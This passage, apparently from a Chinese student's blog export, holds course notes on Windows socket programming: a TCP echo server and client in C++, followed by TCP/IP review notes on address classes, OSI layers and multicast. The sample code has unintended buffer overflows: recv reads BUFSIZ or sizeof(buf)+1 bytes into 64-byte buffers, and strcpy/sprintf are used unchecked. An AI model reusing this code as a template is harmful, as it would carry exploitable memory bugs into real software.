class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// TcpServer.cpp : 定义控制台应用程序的入口点。</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;stdafx.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;WINSOCK2.H&gt;</span>   </span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br>  <br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib,<span class="hljs-meta-string">&quot;WS2_32.lib&quot;</span>)   </span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BUF_SIZE    64      <span class="hljs-comment">// 缓冲区大小</span></span><br><br><span class="hljs-keyword">int</span> _tmain(<span class="hljs-keyword">int</span> argc, _TCHAR* argv[])<br>&#123;<br>WSADATA wsd;<span class="hljs-comment">// WSADATA变量，用于初始化Windows Socket   </span><br>    SOCKET  sServer;<span class="hljs-comment">// 服务器套接字，用于监听客户端请求</span><br>    SOCKET  sClient;<span class="hljs-comment">// 客户端套接字，用于实现与客户端的通信   </span><br>    <span class="hljs-keyword">int</span>     retVal;<span class="hljs-comment">// 调用各种Socket函数的返回值   </span><br>    <span class="hljs-keyword">char</span>    buf[BUF_SIZE];<span class="hljs-comment">// 用于接受客户端数据的缓冲区   </span><br>  <br>    <span class="hljs-comment">// 初始化套接字动态库   </span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">WSAStartup</span>(<span class="hljs-built_in">MAKEWORD</span>(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>),&amp;wsd) != <span class="hljs-number">0</span>)   <br>    &#123;   <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;WSAStartup failed !\n&quot;</span>);   <br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;   <br>    &#125;     <br>    <span class="hljs-comment">// 创建用于监听的套接字   </span><br>    sServer = <span class="hljs-built_in">socket</span>(AF_INET,SOCK_STREAM,IPPROTO_TCP);   <br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> iMode = <span class="hljs-number">1</span>;<br>    retVal = <span class="hljs-built_in">ioctlsocket</span>(sServer, FIONBIO, &amp;iMode);<br>    <span class="hljs-keyword">if</span>(INVALID_SOCKET == sServer)   <br>    &#123;   <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;socket failed !\n&quot;</span>);   <br>        <span class="hljs-built_in">WSACleanup</span>();   <br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;   <br>    &#125;     <br><br>    <span class="hljs-comment">// 设置服务器套接字地址   </span><br>    SOCKADDR_IN addrServ;   <br>    addrServ.sin_family = AF_INET;   <br>    addrServ.sin_port = <span class="hljs-built_in">htons</span>(<span class="hljs-number">9990</span>);<span class="hljs-comment">// 监听端口为9990</span><br>    addrServ.sin_addr.S_un.S_addr = <span class="hljs-built_in">htonl</span>(INADDR_ANY);    <br>    <span class="hljs-comment">// 绑定套接字sServer到本地地址，端口9990  </span><br>    retVal = <span class="hljs-built_in">bind</span>(sServer,(<span class="hljs-keyword">const</span> struct sockaddr*)&amp;addrServ,<span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(SOCKADDR_IN));   <br><br>    <span class="hljs-keyword">if</span>(SOCKET_ERROR == retVal)   <br>    &#123;   <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;bind failed !\n&quot;</span>);   <br>        <span class="hljs-built_in">closesocket</span>(sServer);   <br>        <span class="hljs-built_in">WSACleanup</span>();   <br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;   <br>    &#125;     <br>    <span class="hljs-comment">// 监听套接字   </span><br>    retVal = <span class="hljs-built_in">listen</span>(sServer,<span class="hljs-number">1</span>);   <br>    <span class="hljs-keyword">if</span>(SOCKET_ERROR == retVal)   <br>    &#123;   <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;listen failed !\n&quot;</span>);   <br>        <span class="hljs-built_in">closesocket</span>(sServer);   <br>        <span class="hljs-built_in">WSACleanup</span>();   <br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;   <br>    &#125;     <br>    <span class="hljs-comment">// 接受客户请求   </span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;TCP Server start...\n&quot;</span>);<br>    sockaddr_in addrClient;<span class="hljs-comment">// 客户端地址</span><br>    <span class="hljs-keyword">int</span> addrClientlen = <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(addrClient);   <br>    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)<br>    &#123;<br>        sClient = <span class="hljs-built_in">accept</span>(sServer, (sockaddr FAR*) &amp; addrClient, &amp;addrClientlen);<br>        <span class="hljs-keyword">if</span> (INVALID_SOCKET == sClient)<br>        &#123;<br>            <span class="hljs-keyword">int</span> err = <span class="hljs-built_in">WSAGetLastError</span>();<br>            <span class="hljs-keyword">if</span> (err == WSAEWOULDBLOCK)<br>            &#123;<br>                <span class="hljs-built_in">Sleep</span>(<span class="hljs-number">100</span>);<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;accept failed!\n&quot;</span>);<br>                <span class="hljs-built_in">closesocket</span>(sServer);<br>                <span class="hljs-built_in">WSACleanup</span>();<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br><br>    &#125;<br>   <br>    <span class="hljs-comment">// 循环接收客户端的数据，直接客户端发送quit命令后退出。  </span><br><span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)<br>&#123;<br><span class="hljs-built_in">ZeroMemory</span>(buf,BUF_SIZE);<span class="hljs-comment">// 清空接收数据的缓冲区</span><br>retVal = <span class="hljs-built_in">recv</span>(sClient,buf,BUFSIZ,<span class="hljs-number">0</span>);<span class="hljs-comment">// </span><br><span class="hljs-keyword">if</span>(SOCKET_ERROR == retVal )   <br>&#123;   <br>            <span class="hljs-keyword">int</span> err = <span class="hljs-built_in">WSAGetLastError</span>();<br>            <span class="hljs-keyword">if</span> (err == WSAEWOULDBLOCK)<br>            &#123;<br>                <span class="hljs-built_in">Sleep</span>(<span class="hljs-number">100</span>);<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (err == WSAETIMEDOUT || err == WSAENETDOWN)<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;recv failed!\n&quot;</span>);<br>                <span class="hljs-built_in">closesocket</span>(sServer);<br>                <span class="hljs-built_in">closesocket</span>(sClient);<br>                <span class="hljs-built_in">WSACleanup</span>();<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>            &#125;<br><br>&#125; <br>        <span class="hljs-keyword">if</span> (buf == <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">continue</span>;<br><span class="hljs-comment">// 获取当前系统时间</span><br>SYSTEMTIME st;<br><span class="hljs-built_in">GetLocalTime</span>(&amp;st);<br><span class="hljs-keyword">char</span> sDateTime[<span class="hljs-number">30</span>];<br><span class="hljs-built_in">sprintf</span>(sDateTime, <span class="hljs-string">&quot;%4d-%2d-%2d %2d:%2d:%2d&quot;</span>,st.wYear,st.wMonth,st.wDay,st.wHour,st.wMinute,st.wSecond);<br><span class="hljs-comment">// 打印输出的信息</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s, Recv From Client [%s:%d] :%s\n&quot;</span>, sDateTime, <span class="hljs-built_in">inet_ntoa</span>(addrClient.sin_addr), addrClient.sin_port, buf);   <br><span class="hljs-comment">// 如果客户端发送quit字符串，则服务器退出</span><br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;quit&quot;</span>) == <span class="hljs-number">0</span>)<br>&#123;<br>    retVal = <span class="hljs-built_in">send</span>(sClient,<span class="hljs-string">&quot;quit&quot;</span>,<span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;quit&quot;</span>),<span class="hljs-number">0</span>);   <br>    <span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">else</span><span class="hljs-comment">// 否则向客户端发送回显字符串</span><br>&#123;<br>    <span class="hljs-keyword">char</span>    msg[BUF_SIZE];  <br>    <span class="hljs-built_in">sprintf</span>(msg, <span class="hljs-string">&quot;Message received - %s&quot;</span>, buf); <br>retVal = <span class="hljs-built_in">send</span>(sClient, msg, <span class="hljs-built_in">strlen</span>(msg),<span class="hljs-number">0</span>);   <br>    <span class="hljs-keyword">if</span>(SOCKET_ERROR == retVal)   <br>&#123;   <br>   <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;send failed !\n&quot;</span>);   <br> <span class="hljs-built_in">closesocket</span>(sServer);   <br>   <span class="hljs-built_in">closesocket</span>(sClient);   <br>   <span class="hljs-built_in">WSACleanup</span>();   <br>   <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;   <br>&#125;   <br>&#125;<br>&#125;<br>    <span class="hljs-comment">// 释放套接字   </span><br>    <span class="hljs-built_in">closesocket</span>(sServer);   <br>    <span class="hljs-built_in">closesocket</span>(sClient);   <br>    <span class="hljs-built_in">WSACleanup</span>();   <br><span class="hljs-comment">// 暂停，按任意键退出</span><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// TcpClient.cpp : 定义控制台应用程序的入口点。</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;stdafx.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Winsock2.H&gt;</span>   </span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br>  <br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib,<span class="hljs-meta-string">&quot;WS2_32.lib&quot;</span>)   </span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BUF_SIZE    64          <span class="hljs-comment">// 缓冲区大小  </span></span><br><br><span class="hljs-keyword">int</span> _tmain(<span class="hljs-keyword">int</span> argc, _TCHAR* argv[])<br>&#123;<br>WSADATA     wsd;<span class="hljs-comment">// 用于初始化Windows Socket   </span><br>    SOCKET      sHost;<span class="hljs-comment">// 与服务器进行通信的套接字   </span><br>    SOCKADDR_IN servAddr;<span class="hljs-comment">// 服务器地址   </span><br>    <span class="hljs-keyword">char</span>        buf[BUF_SIZE];<span class="hljs-comment">// 用于接受数据缓冲区   </span><br>    <span class="hljs-keyword">int</span>         retVal;<span class="hljs-comment">// 调用各种Socket函数的返回值   </span><br><span class="hljs-comment">// 初始化Windows Socket</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">WSAStartup</span>(<span class="hljs-built_in">MAKEWORD</span>(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>),&amp;wsd) != <span class="hljs-number">0</span>)   <br>    &#123;   <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;WSAStartup failed !\n&quot;</span>);   <br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;   <br>    &#125;     <br>    <span class="hljs-comment">// 创建套接字   </span><br>    sHost = <span class="hljs-built_in">socket</span>(AF_INET,SOCK_STREAM,IPPROTO_TCP);   <br>    <span class="hljs-keyword">if</span>(INVALID_SOCKET == sHost)   <br>    &#123;   <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;socket failed !\n&quot;</span>);   <br>        <span class="hljs-built_in">WSACleanup</span>();   <br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;   <br>    &#125;    <br>    <span class="hljs-comment">// 设置服务器地址   </span><br>    servAddr.sin_family = AF_INET;   <br>    servAddr.sin_addr.S_un.S_addr = <span class="hljs-built_in">inet_addr</span>(<span class="hljs-string">&quot;127.0.0.1&quot;</span>);<span class="hljs-comment">// 用户需要根据实际情况修改</span><br>    servAddr.sin_port = <span class="hljs-built_in">htons</span>(<span class="hljs-number">9990</span>);<span class="hljs-comment">// 在实际应用中，建议将服务器的IP地址和端口号保存在配置文件中</span><br>    <span class="hljs-keyword">int</span> sServerAddlen = <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(servAddr);<span class="hljs-comment">// 计算地址的长度       </span><br>    <span class="hljs-comment">// 连接服务器   </span><br><span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)<br>&#123;<br>retVal = <span class="hljs-built_in">connect</span>(sHost, (LPSOCKADDR)&amp;servAddr, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(servAddr));<br><span class="hljs-keyword">if</span> (SOCKET_ERROR == retVal)<br>&#123;<br><span class="hljs-keyword">int</span> err = <span class="hljs-built_in">WSAGetLastError</span>();<br><span class="hljs-keyword">if</span> (err == WSAEWOULDBLOCK || err == WSAEINVAL)<br>&#123;<br><span class="hljs-built_in">Sleep</span>(<span class="hljs-number">500</span>);<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (err == WSAEISCONN)<br>&#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;connect failed !\n&quot;</span>);<br><span class="hljs-built_in">closesocket</span>(sHost);<br><span class="hljs-built_in">WSACleanup</span>();<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// 循环向服务器发送字符串，并显示反馈信息。</span><br><span class="hljs-comment">// 发送quit将使服务器程序退出，同时客户端程序自身也将退出</span><br><span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)<br>&#123;<br><span class="hljs-comment">// 向服务器发送数据   </span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please input a string to send: &quot;</span>);<br><span class="hljs-comment">// 接收输入的数据</span><br>std::string str;<br>std::<span class="hljs-built_in">getline</span>(std::cin, str);<br><span class="hljs-comment">// 将用户输入的数据复制到buf中</span><br><span class="hljs-built_in">ZeroMemory</span>(buf,BUF_SIZE);   <br><span class="hljs-built_in">strcpy</span>(buf,str.<span class="hljs-built_in">c_str</span>());   <br>        <span class="hljs-keyword">if</span>(buf[<span class="hljs-number">0</span>]==<span class="hljs-string">&#x27;\0&#x27;</span>)<br>            <span class="hljs-keyword">continue</span>;<br><span class="hljs-comment">// 向服务器发送数据</span><br><span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)<br>&#123;<br>retVal = <span class="hljs-built_in">send</span>(sHost, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);<br><span class="hljs-comment">//retVal = WSASend(sHost, buf, BUF_SIZE, strlen(buf),0,NULL,NULL);</span><br><span class="hljs-keyword">if</span> (SOCKET_ERROR == retVal)<br>&#123;<br><span class="hljs-keyword">int</span> err = <span class="hljs-built_in">WSAGetLastError</span>();<br><span class="hljs-keyword">if</span> (err == WSAEWOULDBLOCK)<br>&#123;<br><span class="hljs-built_in">Sleep</span>(<span class="hljs-number">500</span>);<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;send failed!\n&quot;</span>);<br><span class="hljs-built_in">closesocket</span>(sHost);<br><span class="hljs-built_in">WSACleanup</span>();<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-comment">// 接收服务器回传的数据  </span><br><span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)<br>&#123;<br><span class="hljs-built_in">ZeroMemory</span>(buf, BUF_SIZE);<br>retVal = <span class="hljs-built_in">recv</span>(sHost, buf, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buf) + <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (SOCKET_ERROR == retVal)<br>&#123;<br><span class="hljs-keyword">int</span> err = <span class="hljs-built_in">WSAGetLastError</span>();<br><span class="hljs-keyword">if</span> (err == WSAEWOULDBLOCK)<br>&#123;<br><span class="hljs-built_in">Sleep</span>(<span class="hljs-number">100</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;waiting back msg!\n&quot;</span>);<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (err == WSAETIMEDOUT || err == WSAENETDOWN)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;recv failed!\n&quot;</span>);<br><span class="hljs-built_in">closesocket</span>(sHost);<br><span class="hljs-built_in">WSACleanup</span>();<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Recv From Server: %s\n&quot;</span>,buf);   <br><span class="hljs-comment">// 如果收到quit，则退出</span><br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;quit&quot;</span>) == <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;quit!\n&quot;</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>    <span class="hljs-comment">// 释放资源   </span><br>    <span class="hljs-built_in">closesocket</span>(sHost);   <br>    <span class="hljs-built_in">WSACleanup</span>();   <br><span class="hljs-comment">// 暂停，按任意键继续</span><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="3-23"><a href="#3-23" class="headerlink" title="3/23"></a>3/23</h2><img src="/2020/02/24/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200323111552979.png" class="" title="image-20200323111552979"><img src="/2020/02/24/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200323113425859.png" class="" title="image-20200323113425859"><h2 id="3-30"><a href="#3-30" class="headerlink" title="3/30"></a>3/30</h2><img src="/2020/02/24/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200330140139366.png" class="" title="image-20200330140139366"><p>阻塞：适合通信量较少的简单应用，没有完成之前不会返回</p><p>非阻塞:并发强</p><h2 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h2><img src="/2020/02/24/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200330140556146.png" class="" title="image-20200330140556146"><img src="/2020/02/24/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200330140713774.png" class="" title="image-20200330140713774"><img src="/2020/02/24/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200330140911046.png" class="" title="image-20200330140911046"><h2 id="4-13"><a href="#4-13" class="headerlink" title="4/13"></a>4/13</h2><img src="/2020/02/24/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200413135556939.png" class="" title="image-20200413135556939"><h2 id="4-20"><a href="#4-20" class="headerlink" title="4/20"></a>4/20</h2><img src="/2020/02/24/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200420113827282.png" class="" title="image-20200420113827282"><h2 id="5-11"><a href="#5-11" class="headerlink" title="5/11"></a>5/11</h2><p>用户类打交道最多的是View视图类，对界面各种操作响应</p>]]></content>
    
    
    <categories>
      
      <category>专业学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>专业学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TCPIP复习</title>
    <link href="/2020/02/08/TCPIP%E5%A4%8D%E4%B9%A0/"/>
    <url>/2020/02/08/TCPIP%E5%A4%8D%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h2><p>A类地址 公有1~126 </p><table><thead><tr><th align="center">地址类型</th><th align="center">公有</th><th align="center">私有</th></tr></thead><tbody><tr><td align="center">A类</td><td align="center">1 ~ 126</td><td align="center">10.0.0.0 ~ 10.255.255.255</td></tr><tr><td align="center">B类</td><td align="center">128 ~ 191</td><td align="center">172.16.0.0 ~ 172.31.255.255</td></tr><tr><td align="center">C类</td><td align="center">192.0.0.0 ~ 223.255.255.255</td><td align="center">192.168.0.0 ~ 192.168.255.255</td></tr></tbody></table><h2 id="直接交付和间接交付"><a href="#直接交付和间接交付" class="headerlink" title="直接交付和间接交付"></a>直接交付和间接交付</h2><p>直接交付 -&gt; 交给同一个网络地址</p><p>间接交付 -&gt; 经过一个直接交付，给路由器，再给路由器 直到到达同一个网络的路由再给主机</p><h2 id="端到端和点到点"><a href="#端到端和点到点" class="headerlink" title="端到端和点到点"></a>端到端和点到点</h2><p>端到端 -&gt; 进程到进程</p><p>点到点 -&gt; 设备到设备</p><h2 id="三元组五元组"><a href="#三元组五元组" class="headerlink" title="三元组五元组"></a>三元组五元组</h2><p>三元组：协议，IP地址，端口</p><p>五元组：三元 + 源IP，源端口</p><h3 id="TCP-可靠性"><a href="#TCP-可靠性" class="headerlink" title="TCP 可靠性"></a>TCP 可靠性</h3><ul><li>流量控制：滑动窗口 } 发送窗口</li><li>拥塞控制： 拥塞窗口 重转定时器</li><li>差错控制</li></ul><h3 id="套接字"><a href="#套接字" class="headerlink" title="套接字"></a>套接字</h3><ul><li>流套接字：TCP 适合大量数据 单播</li><li>数据报套接字： UDP</li><li>原始套接字：编写自定底层协议</li></ul><h3 id="IP多播"><a href="#IP多播" class="headerlink" title="IP多播"></a>IP多播</h3><p>==五个前提？==</p><p>多播地址 224.0.0.0 ~ 239.255.255.255</p><p>IP地址的低23位替换mac地址低23位，第24位为0</p><ul><li>语义</li><li>语法</li><li>时序</li></ul><h2 id="OIS七层模型"><a href="#OIS七层模型" class="headerlink" title="OIS七层模型"></a>OIS七层模型</h2><table><thead><tr><th align="center">层次</th><th align="center">名称</th><th align="center">功能</th></tr></thead><tbody><tr><td align="center">应用层</td><td align="center">报文/消息</td><td align="center"></td></tr><tr><td align="center">表示层</td><td align="center"></td><td align="center">定义数据格式和加密标准。将一种格式转换成另一种格式</td></tr><tr><td align="center">会话层</td><td align="center"></td><td align="center">验证会话双方，提供身份验证</td></tr><tr><td align="center">传输层</td><td align="center">段</td><td align="center">网络节点之间的可靠数据传输</td></tr><tr><td align="center">网络层</td><td align="center">包</td><td align="center"></td></tr><tr><td align="center">链路层</td><td align="center">帧</td><td align="center"></td></tr><tr><td align="center">物理层</td><td align="center">流</td><td align="center"></td></tr></tbody></table><h2 id="TCP-IP四层"><a href="#TCP-IP四层" class="headerlink" title="TCP/IP四层"></a>TCP/IP四层</h2><table><thead><tr><th>层次</th><th></th><th></th></tr></thead><tbody><tr><td>应用层</td><td></td><td></td></tr><tr><td>传输层</td><td>提供端到端通信</td><td></td></tr><tr><td>网络层</td><td>IP数据包传输、路由选择、流量控制和拥塞控制</td><td></td></tr><tr><td>网络接口层</td><td></td><td></td></tr></tbody></table><img src="/2020/02/08/TCPIP%E5%A4%8D%E4%B9%A0/image-20200104164157071.png" class="" title="image-20200104164157071"><img src="/2020/02/08/TCPIP%E5%A4%8D%E4%B9%A0/image-20200104164216242.png" class="" title="image-20200104164216242"><h2 id="记忆"><a href="#记忆" class="headerlink" title="记忆"></a>记忆</h2><p>以太网MTU最大传输单元，最大值1500字节</p><p>基本概念：协议，封装，服务，接口</p><p>IEEE802.3 CSMA/CD 总线媒体访问</p><p>802.4 令牌总线</p><p>802.5 令牌环</p><h2 id="数据链路层"><a href="#数据链路层" 